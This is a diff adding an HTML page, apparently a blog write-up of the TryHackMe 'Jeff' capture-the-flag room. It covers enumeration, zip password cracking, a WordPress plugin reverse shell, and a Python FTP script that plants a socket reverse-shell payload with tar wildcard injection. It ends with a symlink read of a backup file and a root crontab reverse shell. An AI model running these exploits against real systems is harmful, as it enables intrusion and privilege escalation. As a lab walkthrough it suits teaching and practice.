@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>RedTribe | THM-Jeff</title>
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+</head>
+
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Anonymous+Pro:wght@700&display=swap');
+
+.brandlogo{
+	font-family: 'Anonymous Pro',monospace; 
+	font-size: 35px;"
+}
+.brandlogo:hover{
+	color: red;
+	font-size: 36px;
+	transition: 1s;
+}
+
+#burger span{
+	background-color: white;
+}
+.para{
+	padding: 20px;
+	margin: 10px;
+}
+
+pre {
+	border: 1px solid black;
+	border-radius: 10px;
+	margin: 10px;
+}
+
+img{
+	margin: 10px;
+	padding: 10px;
+
+}
+
+p{
+	color: black;
+}
+.notification{
+	border: 0.5px solid lightgray;
+	border-radius: 15px;
+}
+
+/*Scrollbar styling*/
+
+/* width */
+::-webkit-scrollbar {
+  width: 10px;
+}
+
+/* Track */
+::-webkit-scrollbar-track {
+  box-shadow: inset 0 0 5px grey;
+  border-radius: 10px;
+}
+
+/* Handle */
+::-webkit-scrollbar-thumb {
+  background: darkslategray;	
+  border-radius: 10px;
+}
+
+</style>
+
+<body>
+
+<!-- Navigation Bar -->
+<nav class="navbar is-dark has-shadow" role="navigation" aria-label="main navigation">
+	
+	<div class="navbar-brand">
+		<a class="navbar-item brandlogo" style="cursor: text;">RedTribe</a>
+	</div>
+
+	<a class="navbar-burger" id="burger">
+	  <span ></span>
+      <span ></span>
+      <span ></span>
+	</a>
+
+	<div id="links_Nav" class="navbar-menu" >
+		<div class="navbar-start">
+			<a href="/index.html" class="navbar-item"> Home </a>
+			<a class="navbar-item"> Writeups </a>
+			<a href="/static/socials.html" class="navbar-item"> Socials </a>
+		</div>
+
+	</div>	
+</nav>
+
+
+
+<!-- Hero card/Title holder -->
+
+<section class="hero is-black ">
+	<div style="margin: 10px;padding: 20px;"  class="container">
+
+		<h1 class="title" >
+			<span class="tag is-danger is-small ">Difficulty: Hard</span><br>
+			Jeff
+		</h1>
+		<h2 class="subtitle is-italic is-size-6">@anii0101 | 4 min read</h2>
+
+	</div>
+</section>
+
+<!---BreadCrumbs-->
+<nav class="breadcrumb is-centered " style="padding-left:15px;"  >
+  <ul>
+    <li><a href="index.html">Home</a></li>
+    <li><a href="overview.html">Writeups</a></li>
+    <li class="is-active"><a href="#" aria-current="page">Jeff</a></li>
+  </ul>
+</nav>	
+
+
+
+<!--Start of Containers--->
+
+	<div class="container para">
+		<div class="notification">
+		<h1 class="title is-size-3 has-text-dark ">👋 Introduction</h1><br>	
+	Hi there!, 
+	Jeff is a room in TryHackme Rated as Hard. it indeed is.
+	Without Further Ado lets Start!
+	</div>
+	</div>
+	
+	<div class="container para" id="more">
+		<div class="notification">
+			<h2 class="title">🔍 Enumeration </h2><br>
+			<h3 class="subtitle has-text-weight-bold is-size-3"><u>Nmap</u></h3>
+			As always we do , lets start off with an nmap scan.
+			<pre>
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 7e:43:5f:1e:58:a8:fc:c9:f7:fd:4b:40:0b:83:79:32 (RSA)
+	|   256 5c:79:92:dd:e9:d1:46:50:70:f0:34:62:26:f0:69:39 (ECDSA)
+	|_  256 ce:d9:82:2b:69:5f:82:d0:f5:5c:9b:3e:be:76:88:c3 (ED25519)
+
+80/tcp open  http    nginx
+	|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+			</pre>
+			<br>
+
+		As the Hint says . Add <code>jeff.thm</code> to your /etc/hosts file. 
+
+		<img src="/images/ph1.png">
+		<br>
+		Nothing here Stands Out and the robots.txt is not found.
+		So lets move on and do a directory Bruteforce.<br><br>
+
+		<h3 class="subtitle has-text-weight-bold is-size-3"> <u> FUFF </u> </h3>
+		<p>
+			I use Fuff scanner as i like it and it is Faster! But You can use any tool like Gobuster/Dirbuster .
+			<br>
+			<code>anii0101@kali:/thm/jeff$ ffuf -u http://jeff.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt -ic -c </code>
+			<br><br>
+			Found 3 directories: <br>
+				* /backups <br>
+				* /admin <br>
+			  * /uploads <br><br>
+
+			  Browsing the above pages shows that all are empty and blank.<br>
+
+			  Further Bruteforce on the directories, i found the following:<br><br>
+
+			  /admin --> found /admin/login.php which is also a blank page .seems like a rabbit hole.<br>
+			  /uploads --> Found index.html with an upload button which doesn't do any action on click . There is no Javascript 
+			  						as well .<br>
+			  /backups --> Enumerating further with extensions(.php, .txt, .zip) , Found a file 'backup.zip' . Downloaded it with wget.
+			  <br><br>
+		</p>
+		<h3 class="subtitle is-size-4"><i>Backup.zip</i></h3><br>
+		 <p>
+				 	Backup.zip seems to be Password Protected. Let's crack the password with <a href="https://github.com/hyc/fcrackzip">fcrackzip</a> .<br><br>
+
+				 	command: <code> fcrackzip -D backup.zip -p /usr/share/wordlist/rockyou.txt </code><br><br>
+				 	 -D = dictionary attack mode<br>
+				 	 -p = wordlist filepath <br><br>
+				 	 It cracked the password within milliseconds.<br><br>
+				 	 <img src="/images/ph2.png" ><br>
+
+				 	 Unzipping the Zip file with the password , we can see it has webroot files. <br>
+				 	 Checking the 'wpadmin.bak' file , we see it contains wordpress password of some user.<br>
+				 	 But we doesn't know where the wordpress is hosted. We can Bruteforce for virtual Hosts with Gobuster/wfuzz.<br><br>
+				 	 command: <code>gobuster vhost -u http://jeff.thm/ -w /usr/share/wordlists/Seclists/Discovery/DNS/subdomains-top1mil-20000.txt </code><br><br>
+
+<pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Mode         : vhost
+[+] Url/Domain   : http://jeff.thm/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/Seclists/Discovery/DNS/subdomains-top1mil-20000.txt
+[+] User Agent   : gobuster/3.1.0
+[+] Timeout      : 10s
+===============================================================
+2019/06/21 11:49:43 Starting gobuster
+===============================================================
+wordpress.jeff.thm 
+^C
+</pre><br><br>
+		
+		<h2 class="subtitle is-size-3"> <u> Foothold</u> :</h2>
+		As we found the vhost, add wordpress.jeff.thm to your /etc/hosts file beside 'jeff.thm'.Now go to 
+		http://wordpress.jeff.thm/wp-admin and login with the Wordpress password we found earlier.<br><br>
+		jeff : [REDACTED]<br><br>
+
+		after logging in , We can easily get a reverse shell by uploading it as a plugin or 404.php file.
+		I tried to edit the 404.php file in themes and uploaded a php reverse shell but that didn't work!
+		I did the same with the plugins. Before I got that working, I think i tried it several times and for some reason the plugins were deleted each time I tried to activate them. So i redeployed the box and now it works.<br><br>
+
+		Paste the <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"> PHP reverse-shell </a> code to the akismet.php plugin and setup a netcat listener ( nc -lvnp [port] ) and then activate the plugin from plugin menu and boom you Droped a Shell.
+
+		 </p>
+	
+
+</div>
+</div>	
+
+<div class="container para">
+		<div class="notification">
+			<h2 class="title">👀 <u>Local Recon </u> </h2><br>
+			<p>
+				We got a shell as low priviledged user www-data. when i checked the webroot /var/ww/html/ i could see a unusual file called
+				ftp_backup.php which had credentials of someone  ( backupmgr: Sup******4*********! ).<br><br>
+				<pre>
+?php
+/* 
+    Todo: I need to finish coding this database backup script.
+          also maybe convert it to a wordpress plugin in the future.
+*/
+
+$dbFile = 'db_backup/backup.sql';
+$ftpFile = 'backup.sql';
+
+$username = "backupmgr";
+$password = "[REDACTED]";
+
+$ftp = ftp_connect("172.20.0.1"); // todo, set up /etc/hosts for the container host
+
+if( ! ftp_login($ftp, $username, $password) ){
+    die("FTP Login failed.");
+}
+
+$msg = "Upload failed";
+if (ftp_put($ftp, $remote_file, $file, FTP_ASCII)) {
+    $msg = "$file was uploaded.\n";
+}
+
+echo $msg;
+ftp_close($conn_id);
+				</pre><br><br>
+				We are Inside a docker container . So we must find a way to  Break out of  it. 
+				From the script we can see that the ftp is being run locally at 172.20.0.1. 
+				we can use CURL to Communicate with it.<br><br>
+
+				<code>curl -v -s -P- 'ftp://backupmgr:[PASSWORD]@172.20.0.1/'</code>
+				<br><br>
+				The above command will list the ftp folder.<br>
+				I got this response :
+				<pre>
+* Connection #0 to host 172.20.0.1 left intact
+drwxr-xr-x    2 1001     1001         4096 May 18 16:14 files
+www-data@Jeff:/var/www/html$</pre><br><br>
+
+				So there is a files directory . What i am going to do is  upload a reverse shell to files and use <a href="https://mqt.gitbook.io/oscp-notes/tar-wildcard-injection"> tar wildcard exploitation method </a> with it so that when its executed i will get a shell out of the container (Hoping that there will be a cronjob running!).
+
+				<pre>
+#!/usr/bin/env python3.7
+
+from ftplib import FTP
+import io
+
+#Connecting to the host
+ftp = FTP(host= '172.20.0.1')
+
+#login for ftp user
+ftp.login(user= "backupmgr", passwd= "[REDACTED]")
+ftp.getwelcome()
+
+ftp.set_pasv(False)
+ftp.dir()
+ftp.cwd('/files')
+
+payload = io.BytesIO(b'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'')
+empty = io.BytesIO(b'')
+
+ftp.storlines('STOR exploit.sh', payload)
+ftp.storlines('STOR --checkpoint=1', empty)
+ftp.storlines('STOR --checkpoint-action=exec=sh exploit.sh', empty)
+
+ftp.quit()
+				</pre>
+					<br><br>
+					Here's the Exploit that i will be using . (note : I did not write this i got this exploit from another blog! :| )<br><br>
+					Pseudocode:<br>
+					1. login to ftp using creds (line 7) <br>
+					2. Set results to passive ( line 9 )<br>
+					3. Cd to /files ( line 11)<br>
+					4. revshell stored in variable payload encoded in bytes. (line 12, 13) <br>
+					5. save exploit.sh , and tar wildcards with storlines() (line 14,15,16) <br>
+					6. Quit  <br>
+
+					set the PORT and IP addr in the reverse shell and execute the above script from victim machine. 
+					and setup a nc listener and wait for connection. <br><br>
+					<img src="images/ph4.png"><br>
+					Got connection as backupmgr.<br><br>
+
+					<h2 class="title"> Privilage Escalation  (Horizontal) </h2>
+					we cannot access /home/jeff . checking the files owned by jeff using find (find / -user jeff 2>/dev/null ), we find /var/backups/jeff.bak but its not readable .
+
+					There was another file called syslog owned by jeff which was administrative tool made by jeff .
+					checking this binary with ltrace we find that it reads from message.txt in /opt/systools<br><br>
+
+					<pre>
+backupmgr@tryharder:/opt/systools$ cat message.txt 
+Jeff, you should login with your own account to view/change your password. I hope you haven't forgotten it.
+
+backupmgr@tryharder:/opt/systools$						
+					</pre><br><br>
+
+					./Syslog
+					<pre>
+backupmgr@tryharder:/opt/systools$ ./systool 
+Welcome to Jeffs System Administration tool.
+This is still a very beta version and some things are not implemented yet.
+Please Select an option from below.
+1 ) View process information.
+2 ) Restore your password.
+3 ) Exit 
+Chose your option: 2
+
+Jeff, you should login with your own account to view/change your password. I hope you haven't forgotten it.
+
+1 ) View process information.
+2 ) Restore your password.
+3 ) Exit 
+Chose your option: 3
+backupmgr@tryharder:/opt/systools$
+					</pre>
+
+					we can see it reads from message.txt and prints it. we can link message.txt (readable) to jeff.bak (unreadable)
+					so that we can read the password from jeff.bak .<br><br>
+					<code> ln -s /var/backups/jeff.bak message.txt</code> <br>
+					This command will link the bak file to message and thus enable us to read it . 
+					Run the syslog binary again and choose option 2 , boom we can read the jeff's password 
+			</p>
+		</div>
+</div>
+
+<div class="container para">
+		<div class="notification">
+			<h1 class="title"> ⛳ Privilege Esc (vertical) </h1><br>
+			<p>
+				we can ssh to jeff , but its a rbash . break out of it using the --noprofile command with ssh .<br><br>
+			<code>ssh jeff@jeff.thm --noprofile </code><br>
+			After logging in , You can now read the <u>user.txt</u> from jeff's home director. You need to hash to MD5 to get the right answer.<br><br>
+			Checking 'sudo-l' Command , surprisingly considering the difficulty level of this room , we can run crontab as root without password. <br>
+
+			<pre>
+jeff@tryharder:~$ sudo -l
+[sudo] password for jeff: 
+Matching Defaults entries for jeff on tryharder:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jeff may run the following commands on tryharder:
+    (ALL) /usr/bin/crontab				
+			</pre>
+
+			I edited the crontab with <code>sudo crontab -e</code> and placed a reverse shell which execute every minute.
+			and i started a netcat listener and got a connection within a minute as root.
+			<BR><BR>
+			Now we can Access the root Flag 
+			<h4> ROOTED ! </h4>
+
+		</p><br>
+			Thank you For reading my writeup and see you later !<3		
+		</div>
+</div>
+
+<!--- End of Containers -->
+
+
+<!-- footer section -->
+<footer class="footer">
+	<div class="content has-text-centered">
+		
+		<p class="brandlogo" style="font-size: 20px;color: gray;">RedTribe</p>
+		<div class="footer-links ">
+			<a class="button is-text"> MIT License </a>
+			<a class="button is-text"> Support</a>	
+		</div><br>
+		
+		<div>
+			<p class="has-text-grey">&copy; 2021  | All rights reserved</p>
+		</div>
+	</div>
+</footer>
+
+
+<!--BurgerScript-->
+<script src="/static/js/burgerToggle.js"></script>
+
+</body>
+</html>
